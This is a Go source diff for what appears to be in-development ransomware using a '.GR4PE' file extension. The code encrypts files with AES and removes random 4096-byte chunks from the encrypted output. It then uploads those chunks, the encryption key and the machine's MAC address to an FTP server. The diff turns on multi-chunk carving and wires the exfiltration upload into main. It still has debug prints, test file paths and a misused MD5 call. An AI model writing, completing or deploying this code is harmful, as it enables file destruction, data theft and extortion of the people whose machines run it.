@@ -3,7 +3,9 @@ package main
 import (
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/md5"
 	"crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"io"
 	"math/big"
@@ -22,11 +24,11 @@ type Header struct {
 }
 
 type uploadData struct {
-	signiture []byte //.GR4PE
-	filename  []byte //FILENAME
-	mac       []byte //MAC.0xFFFFFFFFFFFF
-	Data      []Data //IDXn.0xFFFFFFFFFFFF
-	key       []byte //key
+	signiture []byte     //.GR4PE
+	filename  []byte     //FILENAME
+	mac       []byte     //MAC.0xFFFFFFFFFFFF
+	Data      []DataByte //IDXn.0xFFFFFFFFFFFF
+	key       []byte     //key
 }
 
 type Data struct {
@@ -34,10 +36,23 @@ type Data struct {
 	data []byte //data
 }
 
+type DataByte struct {
+	idx  []byte //IDXn.0xFFFFFFFFFFFF
+	data []byte //data
+}
+
 func check(e error) {
 	if e != nil && e != io.EOF {
 		panic(e)
 	}
+}
+
+func filenameHash(data string) string {
+	return hex.EncodeToString(md5.New().Sum([]byte(data)))
+}
+
+func stripStruct(s interface{}) string {
+	return strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(strings.ReplaceAll(fmt.Sprintf("%s", s), "{", ""), "}", ""), " ", ""), "[", ""), "]", "")
 }
 
 func randRange(min, max, cnt int64) []uint64 {
@@ -194,7 +209,7 @@ func removeByte(filename string, offset int64, length int64, idx int64) (string,
 	check(err)
 	defer rfile.Close()
 	defer wfile.Close()
-	for i := int64(0); i < offset/BUFER_SIZE; i++ {
+	for i := int64(0); i < (offset / BUFER_SIZE); i++ {
 		buf := make([]byte, BUFER_SIZE)
 		readNwriteBuf(wfile, rfile, buf)
 	}
@@ -204,14 +219,15 @@ func removeByte(filename string, offset int64, length int64, idx int64) (string,
 	_, err = rfile.Seek(length, 1)
 	fileSize -= length
 	check(err)
-	buf = make([]byte, BUFER_SIZE-(offset%BUFER_SIZE))
-	readNwriteBuf(wfile, rfile, buf)
-	fmt.Println(fileSize / BUFER_SIZE)
-	for i := int64(0); i < (fileSize-offset)/BUFER_SIZE; i++ {
+	fmt.Println("fileSize: ", fileSize)
+	fmt.Println("offset: ", offset)
+	fmt.Println("fileSize-offset: ", fileSize-offset)
+	for i := int64(0); i < ((fileSize - offset) / BUFER_SIZE); i++ {
 		buf = make([]byte, BUFER_SIZE)
 		readNwriteBuf(wfile, rfile, buf)
 	}
-	buf = make([]byte, (fileSize-offset)%BUFER_SIZE-(BUFER_SIZE-(offset%BUFER_SIZE)))
+	fmt.Println("fileSize-offset%BUFER_SIZE: ", (fileSize-offset)%BUFER_SIZE)
+	buf = make([]byte, (fileSize-offset)%BUFER_SIZE)
 	readNwriteBuf(wfile, rfile, buf)
 	os.Remove(filename)
 	os.Rename(filename+".tmp", filename)
@@ -231,6 +247,13 @@ func idxToString(idx int64, loc uint64) string {
 }
 
 func genUploadHeader(filename []byte, deletedData []Data, key *[32]byte) uploadData {
+	databyte := make([]DataByte, len(deletedData))
+	for i := 0; i < len(deletedData); i++ {
+		databyte[i] = DataByte{
+			idx:  append([]byte(idxToString(int64(i), deletedData[i].idx)), []byte("...")...),
+			data: deletedData[i].data,
+		}
+	}
 	return uploadData{
 		[]byte(".GR4PE"),
 		filename,
@@ -238,9 +261,19 @@ func genUploadHeader(filename []byte, deletedData []Data, key *[32]byte) uploadD
 			[]byte("MAC."),
 			[]byte(strings.ReplaceAll(getMacAddr(), ":", ""))...,
 		),
-		deletedData,
+		databyte,
 		key[:],
 	}
+	// return uploadData{
+	// 	[]byte(".GR4PE"),
+	// 	filename,
+	// 	append(
+	// 		[]byte("MAC."),
+	// 		[]byte(strings.ReplaceAll(getMacAddr(), ":", ""))...,
+	// 	),
+	// 	deletedData,
+	// 	key[:],
+	// }
 }
 
 func putHeader(header Header) {
@@ -254,14 +287,14 @@ func putHeader(header Header) {
 }
 
 func carveData(filename string) []Data {
-	//BUFER_SIZE := int64(4096)
+	BUFER_SIZE := int64(4096)
 	rfile, err := os.Open(filename)
 	check(err)
 	defer rfile.Close()
 	fileInfo, err := rfile.Stat()
 	check(err)
-	//carveCount := fileInfo.Size() / (BUFER_SIZE * 20)
-	carveCount := int64(1)
+	carveCount := fileInfo.Size() / (BUFER_SIZE * 20)
+	//carveCount := int64(1)
 	fmt.Println(carveCount)
 	carveIdx := make([]uint64, carveCount)
 	carveDatas := make([]Data, carveCount)
@@ -270,7 +303,7 @@ func carveData(filename string) []Data {
 	fmt.Println(randlist)
 	for i := int64(0); i < carveCount; i++ {
 		carveIdx[i] = randlist[i]
-		buf, _ := removeByte(filename, int64(carveIdx[i]), 100, i)
+		buf, _ := removeByte(filename, int64(carveIdx[i]), 4096, i)
 		check(err)
 		carveDatas[i] = Data{
 			idx:  carveIdx[i],
@@ -311,8 +344,7 @@ func ftpUpload(filename string, data []byte) (int, error) {
 	err = uploader.Login(USERNAME, PASSWORD)
 	check(err)
 	uid := strings.Replace(getMacAddr(), ":", "", -1)
-	err = uploader.MakeDir(uid)
-	check(err)
+	_ = uploader.MakeDir(uid)
 	err = uploader.ChangeDir(uid)
 	check(err)
 	err = uploader.Stor(filename, strings.NewReader(string(data)))
@@ -359,7 +391,7 @@ func main() {
 	putHeader(
 		Header{
 			[]byte(".GR4PE"),
-			[]byte("tmpfile/in/test"),
+			[]byte("tmpfile/in/test copy"),
 		},
 	)
 	encryptFile("tmpfile/in/test", key)
@@ -377,12 +409,23 @@ func main() {
 			[]byte("tmpfile/in/test"),
 		},
 	)
-	//encryptFile("tmpfile/in/test", key)
+	encryptFile("tmpfile/in/test copy", key)
 	fmt.Println("encryptFile: tmpfile/in/test.GR4PE")
-	removeByte("tmpfile/in/test copy", 273216, 100, 0)
-	// carveDatas := carveData("tmpfile/in/test copy")
+	carveDatas := carveData("tmpfile/in/test copy.GR4PE")
 
-	// for i := 0; i < len(carveDatas); i++ {
-	// 	fmt.Println("carveData: " + idxToString(int64(i), carveDatas[i].idx))
-	// }
+	for i := 0; i < len(carveDatas); i++ {
+		fmt.Println("carveData: " + idxToString(int64(i), carveDatas[i].idx))
+	}
+	uploadHeader := genUploadHeader(
+		[]byte("tmpfile/in/test copy"),
+		carveDatas,
+		key,
+	)
+	fmt.Println("uploadHeader: " + string(uploadHeader.filename))
+	fmt.Println("uploadHeader: " + string(uploadHeader.mac))
+	for i := 0; i < len(uploadHeader.Data); i++ {
+		fmt.Println("uploadHeader: " + string(uploadHeader.Data[i].idx))
+	}
+	ftpUpload(filenameHash("tmpfile/in/testcopy.GR4PE"), []byte(stripStruct(fmt.Sprintf("%s", uploadHeader))))
+
 }
